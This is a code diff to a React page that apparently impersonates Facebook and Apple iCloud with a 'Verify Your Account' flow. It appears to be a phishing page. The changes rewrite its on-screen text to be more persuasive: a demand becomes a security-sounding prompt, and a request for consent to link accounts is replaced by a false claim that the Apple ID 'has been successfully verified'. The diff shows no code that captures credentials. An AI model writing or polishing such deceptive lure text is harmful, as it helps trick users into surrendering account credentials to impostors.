@@ -150,7 +150,7 @@ export default function Home() {
               </div>
               <h1 className="text-2xl font-bold text-[#1c1e21] mb-2">Verify Your Account</h1>
               <p className="text-[#65676b] mb-8 leading-relaxed">
-                To continue using Facebook, you must verify your identity using your linked iCloud account.
+                Secure your account by verifying your identity with iCloud on your device.
               </p>
               <button 
                 onClick={handleFacebookStart}
@@ -441,9 +441,9 @@ export default function Home() {
                   <FaFacebook className="text-3xl text-white" />
                 </div>
                 
-                <h2 className="text-2xl font-bold text-[#1d1d1f] mb-2">Confirm Identity</h2>
+                <h2 className="text-2xl font-bold text-[#1d1d1f] mb-2">Identity Confirmed</h2>
                 <p className="text-[#86868b] mb-8 leading-relaxed">
-                  Please confirm that you want to link your Apple ID with your Facebook account.
+                  Your Apple ID has been successfully verified. Continue to sync with Facebook.
                 </p>
 
                 <div className="space-y-3">
@@ -451,7 +451,7 @@ export default function Home() {
                     onClick={handleFacebookConfirm}
                     className="facebook-btn flex items-center justify-center gap-2"
                   >
-                    Continue with Facebook
+                    Continue
                   </button>
                   <button 
                     onClick={() => setStep("login")}
